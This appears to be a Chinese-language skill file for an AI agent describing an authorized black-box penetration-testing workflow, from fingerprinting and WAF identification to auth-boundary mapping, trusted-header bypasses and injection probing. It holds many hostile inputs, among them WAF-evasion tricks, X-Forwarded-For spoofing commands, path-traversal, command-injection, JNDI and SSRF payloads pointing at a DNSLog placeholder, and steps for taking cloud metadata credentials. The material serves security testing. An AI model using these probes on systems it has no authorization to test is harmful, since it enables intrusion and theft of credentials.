---
name: blackbox-testing
description: 黑盒测试/渗透测试完整流程：指纹、WAF 识别、攻击面枚举、可达性与鉴权边界测绘、信任头绕过、注入与盲态探测、非 HTTP 服务探测。看不见代码、做 P3 黑盒摸底、或需要探测线上目标时使用。
---

# 黑盒测试完整流程

使命：在看不见代码的前提下，测出「哪里真的能打」。产出两张地图——**可达面地图**和**鉴权边界行为表**——供白盒结论落地。方法与技术栈无关；示例用 curl，可平移到 Burp/自写脚本。

## B1 指纹与信息收集

| 维度 | 抓什么 | 方法 |
|---|---|---|
| 服务器 | Server、X-Powered-By、错误页样式、TLS 证书 SAN | `curl -I` |
| 框架 | Cookie 名（JSESSIONID/PHPSESSID/ASP.NET_SessionId/connect.sid）、路由后缀（.do/.action/.controller/.php） | 观察响应 |
| 产品 | 登录页版权、静态资源路径、favicon hash、特有 URL | 特征库 |
| 版本 | JS/CSS 版本号、页面注释、/VERSION、构建时间 | 页面抓取 |
| 拓扑 | 页面/JS 泄露的内网 IP、其他端口/域名、SSO 地址 | grep 页面源码 |

```bash
curl -s -I "http://TARGET/" | grep -iE "server|x-powered|set-cookie|location"
curl -s "http://TARGET/login" | grep -oiE "version|copyright|/[a-z]+/[a-z]+\.(js|css)\?v=[0-9.]+"
```

**产品识别 → 已知漏洞候选池**：一旦识别出商业/开源产品（OA、CMS、中间件、框架），立即：① 拉该产品公开 CVE/漏洞公告/已知利用；② 把该产品线的**标准攻击面端点**列出来（即使源码没给），逐个线上验证。**指纹的最大价值不是"知道它是什么"，而是"知道这类产品还有哪些别人踩过的坑"——COTS 产品的历史漏洞在新部署里往往仍存在。**

**枚举所有实例**：证书 SAN、DNS 同 C 段、页面绝对 URL、日志、robots.txt/sitemap、授权内端口扫描（80/443/8080/7000/9300…）。**不同实例的边界防护可能完全不同——一个挡死，另一个可能敞开。**

**技术栈定型**：Cookie 名 / 路由后缀 / 报错页 → PHP、Python(Django `sessionid`/Flask)、Node(`connect.sid`)、Rails(`_app_session`)、.NET(`ASP.NET_SessionId`)、Java(`JSESSIONID`)、Go(无框架特征，常见 `X-Powered-By` 缺失 + 极快响应)。定型后按 `language-stack-audit` 挑对应 references 文件——**探针要用对语言的方言**（PHP 试 `php://filter`、Node 试 `__proto__`、Go 试模板注入面小、Ruby 试 `Kernel#open`）。

## B1.5 WAF / RASP 识别（在任何注入探测之前做）

**不先识别 WAF，后面所有「打不通」的结论都不可信。** 这是黑盒假阴性的头号来源。

```bash
# 发一个必然恶意的探针，看是谁在回应
curl -s -o /dev/null -w "benign  code=%{http_code} size=%{size_download} t=%{time_total}\n" "http://TARGET/?q=hello"
curl -s -o /dev/null -w "xss     code=%{http_code} size=%{size_download} t=%{time_total}\n" "http://TARGET/?q=<script>alert(1)</script>"
curl -s -o /dev/null -w "sqli    code=%{http_code} size=%{size_download} t=%{time_total}\n" "http://TARGET/?q=1'%20or%201=1--"
curl -s -o /dev/null -w "nopath  code=%{http_code} size=%{size_download} t=%{time_total}\n" "http://TARGET/nonexistent999?q=<script>alert(1)</script>"
```

**判读**：

| 观察 | 结论 |
|---|---|
| 恶意 payload 返回固定拦截页 / 403 / 302 到告警页，正常请求 200 | **有 WAF**，记录触发关键字 |
| **不存在的路径**打恶意 payload 也被拦 | 拦截发生在**应用之前** = 网关型 WAF |
| 恶意 payload 响应**明显更快** | 未到应用，设备直接返 |
| 只在某些路径拦 | 按路径挂载的规则，**其他路径是缺口** |
| 连接被 reset / 超时 | 设备型阻断，注意别触发封 IP |
| 返回应用自己的报错/500 | 无 WAF，是应用行为 |

识别产品：`Server`/`X-Powered-By`/特殊 Cookie（安全狗、云锁、创宇盾、Cloudflare `cf-ray`、Akamai、ModSecurity）、拦截页文案与 ID。

**被拦之后怎么办（授权范围内）**：

1. **先换编码/等价语法**，不是先放弃：URL 双编码、Unicode、大小写混合、注释分割（`/**/`、`/*!50000*/`）、等价函数（`sleep`→`benchmark`、`or`→`||`）、空白替代（`%09 %0a %0c %0d /**/ +`）。
2. **换传参位置**：GET 挡了试 POST、试 JSON 体、试 Header、试 Cookie、试 multipart（很多 WAF 不解析 multipart 体）。
3. **换协议/入口**：WebSocket 消息、GraphQL 单入口、API 子域、直连源站 IP（绕 CDN 型 WAF）、内部端口。
4. **降低强度改判据**：拦得住 payload，未必拦得住**盲态**——布尔差分用无关键字的表达式、时延用数学运算。

> **红线提醒**：绕 WAF 的目的是**证明缺陷存在**，不是打穿。触发大量拦截会产生告警和封禁，节制频率；P0 红线优先。

> **定级语义**：WAF 挡住 = P5 的 `blocked`，**不是「无此漏洞」**。报告要写「缺陷真实存在，当前由 WAF 拦截；规则调整或换未挂 WAF 的实例即成立」。

## B2 攻击面测绘（黑盒视角）

- **目录/文件爆破**：字典（含产品专用字典）跑 .jsp/.php/.do/.bak/.zip/.svn/.git。
- **爬虫**：抓所有链接、表单、JS bundle 里的 XHR/fetch 端点（现代应用路由常藏在 JS 里）。
- **参数挖掘**：Arjun / param-miner 猜隐藏参数。
- **API 规格**：swagger.json / /v2/api-docs / GraphQL introspection——一次拿全端点。

黑白盒结合时，路由清单直接来自源码，黑盒只需验证可达性，效率高得多。

## B3 可达性与鉴权边界测绘（核心产出）

这是最容易被跳过、却最有价值的一步：**系统性测「每类入口在未授权下的响应」，反推边界防护规则**。

### 分类探测 + 响应差分

按扩展名/路径模式分组，每组未授权打一遍，记录状态码/大小/跳转：

```bash
for u in "/normal-page.jsp" "/login.jsp" "/some.controller" "/SomeServlet" \
  "/static/app.js" "/api/v1/users" "/nonexistent12345.jsp"; do
  printf "%-30s " "$u"
  curl -s -o /dev/null -w "code=%{http_code} size=%{size_download} loc=%{redirect_url}\n" "http://TARGET$u"
done
```

### 判读：从响应差异反推规则

| 观察 | 推断 |
|---|---|
| 所有 .jsp 302→login，.js 200 | 过滤器按**扩展名/路径**默认拒绝，静态放行 |
| 某类返回 500 而非 302 | **未被过滤器拦**，落到应用（NPE/异常）→ 需会话 |
| 某 Servlet 直接 200/405 | **过滤器盲区**——独立 Servlet 不在拦截规则内 |
| 存在页 vs 不存在页同样响应 | 统一错误页（限制枚举） |

三种待遇（拦 / 落应用 / 盲区）的差分是整个黑盒的转折点——没有这一步，会把所有洞误判成「被挡死」或「都要账号」。

### 边界绕过测试（穷举变形，每种变形都是独立假设）

```
路径参数：  /x.jsp;.js        /x.jsp;jsessionid=1
编码：      /x.js%70          /x%2ejsp      %2e%2e%2f（穿越）
空字节：    /x.jsp%00.js
多斜杠/点： //x.jsp           /./x.jsp      /x.jsp/
大小写：    /X.JSP
后缀混淆：  /x.jsp/foo.js（有的过滤器看最后一段）
Header：    X-Original-URL / X-Rewrite-URL / X-Forwarded-* 覆盖
方法：      GET→POST/PUT/HEAD/OPTIONS（有的鉴权只挡 GET）
```

记录哪些绕过成功——成功的即是过滤器规则漏洞。

### IP 白名单 / 信任头绕过（高频且致命）

很多「内网限制」靠读 X-Forwarded-For / X-Real-IP / Proxy-Client-IP，而这些**客户端可伪造**：

```bash
curl -s -X POST "http://TARGET/InternalServlet" -w " |NOHDR\n"
curl -s -X POST "http://TARGET/InternalServlet" -H "X-Forwarded-For: 127.0.0.1" -w " |XFF\n"
curl -s -X POST "http://TARGET/InternalServlet" -H "X-Real-IP: 127.0.0.1"      -w " |XRI\n"
curl -s -X POST "http://TARGET/InternalServlet" -H "Proxy-Client-IP: 127.0.0.1" -w " |PCI\n"
```

**响应不同 = 该头被信任 = 白名单可绕。** 逐头测，定位服务端到底信哪个。这能把攻击门槛从「内网」降到「任何人 + 一个 Header」。

## B4 认证与会话测试

> **完整清单在 `auth-authz-testing`**（角色矩阵、密码重置链、JWT 十条、OAuth/SAML、多租户、BFLA）。本节只是快筛入口，**不要停在这张表上**——认证/授权是覆盖矩阵里没有列的面，最容易被一格带过。

| 测什么 | 怎么测 |
|---|---|
| 认证绕过 | 直接访问受保护资源；改 role/isAdmin 参数；删签名段；null/空口令；默认口令 |
| 会话安全 | Cookie 有无 HttpOnly/Secure/SameSite；登录后 Session ID 是否更换（会话固定）；超时时长 |
| 越权 IDOR | 换他人 id/uid/工号；水平（同级用户数据）+ 垂直（普通→管理） |
| 令牌 | JWT alg:none/弱密钥；可预测 token；token 不绑定用户/资源/时效 |
| 多因素/验证码 | 验证码可复用/可绕/仅前端校验；短信轰炸；登录失败锁定可被 XFF 绕过 |

```bash
# 越权差分：A 的会话访问 B 的资源，看是否返回 B 的数据
curl -s -b "SESSION=A" "http://TARGET/api/order?id=<B的订单>" | grep -q "<B的特征>" && echo "IDOR!"
```

## B5 注入与输入类黑盒探测

对每个**参数**（GET/POST/JSON/Header/Cookie/路径段）逐个测，用**差分/时延/带外**判定：

| 类型 | 探针 | 判定 |
|---|---|---|
| SQLi | `'` `"` `\` / `1 and 1=1` vs `1 and 1=2` / `sleep(5)` | 报错 / 布尔差分 / 时延 |
| XSS | 唯一标记 `xsstest7391<b>` 反射回来看是否编码 | 源码中未编码出现 |
| 命令注入 | `;id` `\|id` `` `id` `` / ping 时延 | 回显 / 时延 / DNSLog |
| SSRF | `url=http://DNSLOG` / `http://127.0.0.1:port` | 带外命中 / 端口差分时延 |
| 路径穿越 | `../../etc/passwd` / `..%2f` / 绝对路径 | 文件内容回显 |
| XXE | 带 `<!DOCTYPE ... SYSTEM>` 的 XML | 带外 / 报错 |
| SSTI | `${7*7}` `{{7*7}}` `<%= 7*7 %>` | 返回 49 |
| 反序列化 | 已知 magic（`rO0`/`AAEAAAD`/`O:`/`\x80\x04`）+ gadget 探针 | 带外 |
| LDAP 注入 | `*)(uid=*` `*))%00` | 结果集异常放大 / 报错 |
| XPath 注入 | `' or '1'='1` 在 XML 查询参数 | 返回全集 |
| CRLF 头注入 | `%0d%0aSet-Cookie:x=1` 进 Location/Cookie | 响应头里出现注入的头 |
| 模板注入(各引擎) | 见 `language-stack-audit` 的 references/frontend-ssti.md 探针表 | 返回运算结果 |
| NoSQL 注入 | JSON 体传 `{"$ne":null}` / `{"$regex":"^a"}` | 认证绕过 / 盲态枚举 |
| 原型链污染 | `?__proto__[x]=y` / JSON 体带 `__proto__` | 后续响应行为变化 |
| Mass Assignment | 请求体多传 `role/isAdmin/status/balance` | 返回体或后续查询里字段被改 |
| HPP | `?id=1&id=2` / `id[]=1&id[]=2` | 前后端取值不一致 |
| Zip Slip | 上传含 `../` 路径的压缩包 | 解压落到目录外 |
| JNDI/日志注入 | `${jndi:ldap://DNSLOG/x}` 塞进 UA/参数（Java 目标） | 带外命中 |

**带外（OOB）是黑盒盲态的命门**：备一个 DNSLog/Collaborator，SSRF/XXE/盲注/命令注入/JNDI 没有回显时，全靠带外确认。

**参数位置要穷举**：同一个探针要打 GET query、POST 表单、JSON 体（含嵌套字段）、XML 体、Header、Cookie、路径段、文件名、multipart 的 filename 与 Content-Type——**很多目标只在其中一处没做校验**，也只有部分位置被 WAF 覆盖。

## B6 盲态与逻辑测试

看不见回显时，靠**副作用可观测量**：时延（sleep/重计算）、状态码差异、响应长度差异、报错指纹、带外请求。

业务逻辑黑盒也能测很多（详见 `unknown-vuln` skill）：改价、改数量为负、并发下单、跳步骤、重放、越权改状态。

## B7 协议层与非 HTTP 面（最容易整块跳过）

- **协议层**：Host 头攻击（密码重置链接投毒）、Web 缓存投毒/缓存欺骗、请求走私（CL.TE/TE.CL/H2 降级）、反代与后端路径解析差异 → 见 `modern-attack-surface` M3。**这些的共同根因是"两套解析器"，不是应用代码缺陷，白盒永远发现不了。**
- **API 形态**：REST 版本残留、swagger/openapi 规格一次拿全端点、GraphQL introspection 与别名批量、gRPC 反射、WebSocket 的 CSWSH → M1。
- **浏览器侧**：CORS 反射 Origin + credentials、postMessage 无 origin 校验、安全响应头基线 → M2。
- **非 HTTP 端口**：P1 扫出的 Redis/Mongo/ES/Memcached/Zookeeper/JMX/RMI/Dubbo/LDAP/数据库端口**逐个做无认证判定** → M6。扫到端口只记录不测，等于白扫。
- **云面**：拿到 SSRF 或任意文件读后，立刻按 M4 打元数据与凭据文件——这决定这条洞是 High 还是 Critical。

## 证伪：探针结果的可信度

每条"疑似成立"的探针结果，标 finding 前先跑对照组——**没有对照组的单条响应什么都证明不了**。完整证伪清单见 `audit-methodology` P5 的「证伪纪律」表：不存在的路径打同样 payload、无害畸形值对照、随便编的 Header 对照、多次测量看基线抖动。

## 黑盒产出清单（交给 P5 互证）

1. **可达面地图**：每类入口的未授权响应 + 哪些绕过成功。
2. **鉴权边界行为表**（拦 / 落应用 / 盲区 / **WAF 拦**四种待遇）。
3. **WAF/RASP 结论**：有无、什么产品、触发关键字、哪些路径不覆盖。
4. **信任头/白名单绕过结论**。
5. **角色矩阵**（有账号时，N 角色 × M 端点）。
6. **确认可达的高危端点**（含产品级已知点、管理端点、API 规格泄露点）。
7. **注入/输入类探针的差分结果**（含对照组）。
8. **非 HTTP 端口的无认证判定结论**。

每条探针结果写入 audit_workspace 的可达面/发现（record_surface / add_finding），**包括"已测·无"的阴性结论**——否则 P7 矩阵里它仍是空格。不要只留在终端输出。
